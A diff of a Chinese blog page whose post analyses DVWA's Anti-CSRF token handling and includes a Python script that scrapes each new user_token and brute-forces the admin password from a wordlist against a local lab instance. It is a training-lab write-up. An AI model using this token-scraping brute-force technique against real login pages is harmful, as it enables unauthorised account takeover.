@@ -1,104 +1,535 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>DVWA之Anti CSRF分析利用(python3+Brute Password) | osword's blog</title><meta name="description" content="前言耍DVWA一直碰到Anti-CSRF，受不了就仔细看看源码，学习一番。发现竟然有这么大个BUG。 BeginNOTICEindex.php&gt;&gt;点击submit之后跳转脚本login.php中主要方法分析: dvwaPage.inc.phpgenerateSessionToken()方法&gt;&gt;通过当前时间生成一个session_ID,转MD5,储存在服务端generateS"><meta name="keywords" content="CSRF"><meta name="author" content="osword"><meta name="copyright" content="osword"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="dns-prefetch" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="DVWA之Anti CSRF分析利用(python3+Brute Password)"><meta name="twitter:description" content="前言耍DVWA一直碰到Anti-CSRF，受不了就仔细看看源码，学习一番。发现竟然有这么大个BUG。 BeginNOTICEindex.php&gt;&gt;点击submit之后跳转脚本login.php中主要方法分析: dvwaPage.inc.phpgenerateSessionToken()方法&gt;&gt;通过当前时间生成一个session_ID,转MD5,储存在服务端generateS"><meta name="twitter:image" content="http://zhzhdoai.github.io/img/404.jpg"><meta property="og:type" content="article"><meta property="og:title" content="DVWA之Anti CSRF分析利用(python3+Brute Password)"><meta property="og:url" content="http://zhzhdoai.github.io/2019/02/20/DVWA%E4%B9%8BAnti-CSRF%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/"><meta property="og:site_name" content="osword's blog"><meta property="og:description" content="前言耍DVWA一直碰到Anti-CSRF，受不了就仔细看看源码，学习一番。发现竟然有这么大个BUG。 BeginNOTICEindex.php&gt;&gt;点击submit之后跳转脚本login.php中主要方法分析: dvwaPage.inc.phpgenerateSessionToken()方法&gt;&gt;通过当前时间生成一个session_ID,转MD5,储存在服务端generateS"><meta property="og:image" content="http://zhzhdoai.github.io/img/404.jpg"><meta property="article:published_time" content="2019-02-20T12:59:21.000Z"><meta property="article:modified_time" content="2020-05-15T08:27:38.000Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
-var t = Cookies.get("theme")
-if (autoChangeMode == '1'){
-  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
-  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
-  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
-  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
 
-  if (t === undefined){
-    if (isLightMode) activateLightMode()
-    else if (isDarkMode) activateDarkMode()
-    else if (isNotSpecified || hasNoSupport){
-      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
-      var now = new Date()
-      var hour = now.getHours()
-      var isNight = hour < 6 || hour >= 18
-      isNight ? activateDarkMode() : activateLightMode()
-  }
-  } else if (t == 'light') activateLightMode()
-  else activateDarkMode()
 
-} else if (autoChangeMode == '2'){
-  now = new Date();
-  hour = now.getHours();
-  isNight = hour < 6 || hour >= 18
-  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
-  else if (t === 'light') activateLightMode()
-  else activateDarkMode() 
-} else {
-  if ( t == 'dark' ) activateDarkMode()
-  else if ( t == 'light') activateLightMode()
-}
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
 
-function activateDarkMode(){
-  document.documentElement.setAttribute('data-theme', 'dark')
-  if (document.querySelector('meta[name="theme-color"]') !== null){
-    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
-  }
-}
-function activateLightMode(){
-  document.documentElement.setAttribute('data-theme', 'light')
-  if (document.querySelector('meta[name="theme-color"]') !== null){
-  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
-  }
-}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://zhzhdoai.github.io/2019/02/20/DVWA%E4%B9%8BAnti-CSRF%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/"><link rel="prev" title="PHP之GET传参黑名单绕过" href="http://zhzhdoai.github.io/2019/02/20/PHP%E4%B9%8BGET%E4%BC%A0%E5%8F%82%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/"><link rel="next" title="sql盲注(附python脚本)" href="http://zhzhdoai.github.io/2019/02/20/sql%E7%9B%B2%E6%B3%A8-%E9%99%84python%E8%84%9A%E6%9C%AC/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  bookmark: {
-    message_prev: '按',
-    message_next: '键将本页加入书签'
-  },
-  runtime_unit: '天',
-  runtime: true,
-  copyright: undefined,
-  ClickShowText: undefined,
-  medium_zoom: false,
-  fancybox: true,
-  Snackbar: undefined,
-  baiduPush: false,
-  highlightCopy: true,
-  highlightLang: true,
-  highlightShrink: 'false',
-  isFontAwesomeV5: false,
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isanchor: false
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-}</script><script>var GLOBAL_CONFIG_SITE = { 
-  isPost: true,
-  isHome: false,
-  isSidebar: true  
-  }</script><noscript><style>
-#page-header {
-  opacity: 1
-}
-.justified-gallery img{
-  opacity: 1
-}
-</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">139</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">36</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Begin"><span class="toc-number">2.</span> <span class="toc-text">Begin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NOTICE"><span class="toc-number">2.1.</span> <span class="toc-text">NOTICE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dvwaPage-inc-php"><span class="toc-number">2.2.</span> <span class="toc-text">dvwaPage.inc.php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Anti-CSRF执行流程"><span class="toc-number">2.3.</span> <span class="toc-text">Anti-CSRF执行流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#问题"><span class="toc-number">2.3.1.</span> <span class="toc-text">问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#token-user成长历程"><span class="toc-number">2.4.</span> <span class="toc-text">token_user成长历程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Brute-password-High"><span class="toc-number">2.5.</span> <span class="toc-text">Brute password(High)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(/img/404.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">osword's blog</a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">DVWA之Anti CSRF分析利用(python3+Brute Password)</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2019-02-20 20:59:21"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2019-02-20</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2020-05-15 16:27:38"><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-05-15</span></time></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>耍DVWA一直碰到Anti-CSRF，受不了就仔细看看源码，学习一番。发现竟然有这么大个BUG。</p>
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="osword">
+  <meta name="keywords" content="">
+  <title>DVWA之Anti CSRF分析利用(python3+Brute Password) - osword&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-02-20 20:59" pubdate>
+        2019年2月20日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      633 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      9
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">DVWA之Anti CSRF分析利用(python3+Brute Password)</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>耍DVWA一直碰到Anti-CSRF，受不了就仔细看看源码，学习一番。发现竟然有这么大个BUG。</p>
 <h1 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h1><h2 id="NOTICE"><a href="#NOTICE" class="headerlink" title="NOTICE"></a>NOTICE</h2><p>index.php&gt;&gt;点击submit之后跳转脚本login.php中<br>主要方法分析:</p>
-<h2 id="dvwaPage-inc-php"><a href="#dvwaPage-inc-php" class="headerlink" title="dvwaPage.inc.php"></a>dvwaPage.inc.php</h2><p>generateSessionToken()方法&gt;&gt;通过当前时间生成一个session_ID,转MD5,储存在服务端<br><img src="./1.png" alt=""><br>generateSessionToken()方法&gt;&gt;判断当前界面是否存在session_token，若存在销毁上一个sessionID 并创建一个新的session_token。不存在直接创建session_token<br><img src="./2.png" alt=""></p>
-<h2 id="Anti-CSRF执行流程"><a href="#Anti-CSRF执行流程" class="headerlink" title="Anti-CSRF执行流程"></a>Anti-CSRF执行流程</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>user_token的提交是怎么被赋值?session_token和user_token是怎么验证相等?<br>问题一:查看源代码如下，$session[‘session_token’]放置于标签name=’’user_token中。<br>在login.php的验证执行，通过reuqests[‘user_token’]方式提取name=’user_token’对应的value值<br>问题二:在运行的login.php脚本中调用checkToken方法检验session_token和user_token值是否相等<br><img src="./3.png" alt=""><br><img src="./4.png" alt=""></p>
-<p>每次访问或跳转至index.php时会调用dvwaPage.inic.php（写有Token Function的文件）。<br><img src="./5.png" alt=""></p>
+<h2 id="dvwaPage-inc-php"><a href="#dvwaPage-inc-php" class="headerlink" title="dvwaPage.inc.php"></a>dvwaPage.inc.php</h2><p>generateSessionToken()方法&gt;&gt;通过当前时间生成一个session_ID,转MD5,储存在服务端<br><img src="./1.png" srcset="/img/loading.gif" alt=""><br>generateSessionToken()方法&gt;&gt;判断当前界面是否存在session_token，若存在销毁上一个sessionID 并创建一个新的session_token。不存在直接创建session_token<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p>
+<h2 id="Anti-CSRF执行流程"><a href="#Anti-CSRF执行流程" class="headerlink" title="Anti-CSRF执行流程"></a>Anti-CSRF执行流程</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>user_token的提交是怎么被赋值?session_token和user_token是怎么验证相等?<br>问题一:查看源代码如下，$session[‘session_token’]放置于标签name=’’user_token中。<br>在login.php的验证执行，通过reuqests[‘user_token’]方式提取name=’user_token’对应的value值<br>问题二:在运行的login.php脚本中调用checkToken方法检验session_token和user_token值是否相等<br><img src="./3.png" srcset="/img/loading.gif" alt=""><br><img src="./4.png" srcset="/img/loading.gif" alt=""></p>
+<p>每次访问或跳转至index.php时会调用dvwaPage.inic.php（写有Token Function的文件）。<br><img src="./5.png" srcset="/img/loading.gif" alt=""></p>
 <h2 id="token-user成长历程"><a href="#token-user成长历程" class="headerlink" title="token_user成长历程"></a>token_user成长历程</h2><ol>
 <li>index.php中&gt;&gt;检查页面是否已存在session_token</li>
 <li>index.php中&gt;&gt;存在，销毁session_token，并创建一个新的session_token</li>
 <li>index.php中&gt;&gt;执行tokenFied()方法，将session_token放置标签中(可以在index.php中审查源码可以看到session_token值)<br>可以看出这里存在BUG，爆破密码可以先提取网页源码中的user_Token进行payload构建。再爆破密码</li>
-<li>login.php&gt;&gt;验证user_token是否与脚本中的session_token相等<br><img src="./6.png" alt=""><br><img src="./7.png" alt=""><br><img src="./6.png" alt=""></li>
+<li>login.php&gt;&gt;验证user_token是否与脚本中的session_token相等<br><img src="./6.png" srcset="/img/loading.gif" alt=""><br><img src="./7.png" srcset="/img/loading.gif" alt=""><br><img src="./6.png" srcset="/img/loading.gif" alt=""></li>
 </ol>
-<h2 id="Brute-password-High"><a href="#Brute-password-High" class="headerlink" title="Brute password(High)"></a>Brute password(High)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">def getToken(url,header):</span><br><span class="line">	try:</span><br><span class="line">		r &#x3D; requests.get(url,headers&#x3D;header)</span><br><span class="line">		print (r.status_code)</span><br><span class="line">		print (len(r.text))</span><br><span class="line">		r.raise_for_status()</span><br><span class="line">		r.encoding&#x3D;r.apparent_encoding</span><br><span class="line">		soup &#x3D; BeautifulSoup(r.text,&#39;html.parser&#39;)</span><br><span class="line">		token &#x3D; soup.find_all(&#39;input&#39;)</span><br><span class="line">		str1 &#x3D; str(token[3])</span><br><span class="line">		new_token &#x3D; str1[46:-11]</span><br><span class="line">		return new_token</span><br><span class="line">	except:</span><br><span class="line">		return &quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header&#x3D;&#123;</span><br><span class="line">&#39;Host&#39;:&#39;192.168.43.195&#39;,</span><br><span class="line">&#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,</span><br><span class="line">&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;71.0.3578.98 Safari&#x2F;537.36&#39;,</span><br><span class="line">&#39;Accept&#39;: &#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">&#39;Referer&#39;: &#39;http:&#x2F;&#x2F;192.168.43.195&#x2F;DVWA&#x2F;vulnerabilities&#x2F;brute&#x2F;index.php&#39;,</span><br><span class="line">&#39;Accept-Language&#39;: &#39;zh-CN,zh;q&#x3D;0.9&#39;,</span><br><span class="line">&#39;Cookie&#39;: &#39;security&#x3D;high; PHPSESSID&#x3D;adf974919653a77c8befadca017f92e7&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;192.168.43.195&#x2F;DVWA&#x2F;vulnerabilities&#x2F;brute&#x2F;index.php&#39;</span><br><span class="line">i&#x3D;0</span><br><span class="line">str3&#x3D;&#39;&#39;</span><br><span class="line">new_token&#x3D;getToken(url,header)</span><br><span class="line">for line in open(&quot;D:&#x2F;&#x2F;rkolin.txt&quot;):</span><br><span class="line">	requal &#x3D;&#39;http:&#x2F;&#x2F;192.168.43.195&#x2F;DVWA&#x2F;vulnerabilities&#x2F;brute&#x2F;&#39;+&quot;?username&#x3D;admin&amp;password&#x3D;&quot;+line.strip()+&quot;&amp;Login&#x3D;Login&amp;user_token&#x3D;&quot;+new_token</span><br><span class="line">	new_token&#x3D;getToken(requal,header)</span><br><span class="line">	i &#x3D; i+1</span><br><span class="line">	print(i,&#39;admin&#39;,new_token,requal)</span><br><span class="line">	if (i &#x3D;&#x3D; 10):</span><br><span class="line">		break</span><br></pre></td></tr></table></figure>
-<p><img src="./8.png" alt=""></p>
+<h2 id="Brute-password-High"><a href="#Brute-password-High" class="headerlink" title="Brute password(High)"></a>Brute password(High)</h2><pre><code class="hljs processing"><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> re
+from bs4 <span class="hljs-keyword">import</span> BeautifulSoup
+def getToken(url,header):
+	<span class="hljs-keyword">try</span>:
+		r = requests.<span class="hljs-built_in">get</span>(url,headers=header)
+		<span class="hljs-built_in">print</span> (r.status_code)
+		<span class="hljs-built_in">print</span> (len(r.<span class="hljs-built_in">text</span>))
+		r.raise_for_status()
+		r.encoding=r.apparent_encoding
+		soup = BeautifulSoup(r.<span class="hljs-built_in">text</span>,<span class="hljs-string">'html.parser'</span>)
+		token = soup.find_all(<span class="hljs-string">'input'</span>)
+		str1 = <span class="hljs-built_in">str</span>(token[<span class="hljs-number">3</span>])
+		new_token = str1[<span class="hljs-number">46</span>:<span class="hljs-number">-11</span>]
+		<span class="hljs-keyword">return</span> new_token
+	except:
+		<span class="hljs-keyword">return</span> <span class="hljs-string">""</span>
+
+
+header=&#123;
+<span class="hljs-string">'Host'</span>:<span class="hljs-string">'192.168.43.195'</span>,
+<span class="hljs-string">'Upgrade-Insecure-Requests'</span>: <span class="hljs-string">'1'</span>,
+<span class="hljs-string">'User-Agent'</span>:<span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'</span>,
+<span class="hljs-string">'Accept'</span>: <span class="hljs-string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span>,
+<span class="hljs-string">'Referer'</span>: <span class="hljs-string">'http://192.168.43.195/DVWA/vulnerabilities/brute/index.php'</span>,
+<span class="hljs-string">'Accept-Language'</span>: <span class="hljs-string">'zh-CN,zh;q=0.9'</span>,
+<span class="hljs-string">'Cookie'</span>: <span class="hljs-string">'security=high; PHPSESSID=adf974919653a77c8befadca017f92e7'</span>
+&#125;
+
+url = <span class="hljs-string">'http://192.168.43.195/DVWA/vulnerabilities/brute/index.php'</span>
+i=<span class="hljs-number">0</span>
+str3=<span class="hljs-string">''</span>
+new_token=getToken(url,header)
+<span class="hljs-keyword">for</span> <span class="hljs-built_in">line</span> in <span class="hljs-built_in">open</span>(<span class="hljs-string">"D://rkolin.txt"</span>):
+	requal =<span class="hljs-string">'http://192.168.43.195/DVWA/vulnerabilities/brute/'</span>+<span class="hljs-string">"?username=admin&amp;password="</span>+<span class="hljs-built_in">line</span>.strip()+<span class="hljs-string">"&amp;Login=Login&amp;user_token="</span>+new_token
+	new_token=getToken(requal,header)
+	i = i+<span class="hljs-number">1</span>
+	<span class="hljs-built_in">print</span>(i,<span class="hljs-string">'admin'</span>,new_token,requal)
+	<span class="hljs-keyword">if</span> (i == <span class="hljs-number">10</span>):
+		<span class="hljs-keyword">break</span></code></pre>
+<p><img src="./8.png" srcset="/img/loading.gif" alt=""></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
 <li>high等级，在爆破密码这一关的，就可以通过python现在index.php直接获取user_token值</li>
 <li>把session_id放置于服务器端且无法不能在前端可见之处进行验证</li>
 <li>审计Anti机制挺有意思，虽然这个比较简单，但还是满有收获的。</li>
 </ol>
-</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">osword</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://zhzhdoai.github.io/2019/02/20/DVWA%E4%B9%8BAnti-CSRF%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/">http://zhzhdoai.github.io/2019/02/20/DVWA%E4%B9%8BAnti-CSRF%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://zhzhdoai.github.io" target="_blank">osword's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CSRF/">CSRF</a></div><div class="post_share"><div class="social-share" data-image="/img/404.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="post-qr-code__img" src="/img/wechat.jpg" alt="微信"/><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="post-qr-code__img" src="/img/alipay.jpg" alt="支付寶"/><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2019/02/20/PHP%E4%B9%8BGET%E4%BC%A0%E5%8F%82%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/"><img class="prev_cover" src="/img/404.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PHP之GET传参黑名单绕过</div></div></a></div><div class="next-post pull_right"><a href="/2019/02/20/sql%E7%9B%B2%E6%B3%A8-%E9%99%84python%E8%84%9A%E6%9C%AC/"><img class="next_cover" src="/img/404.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">sql盲注(附python脚本)</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2018/12/27/DVWA-CSRF/" title="DVWA_CSRF"><img class="relatedPosts_cover" src="/img/404.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" 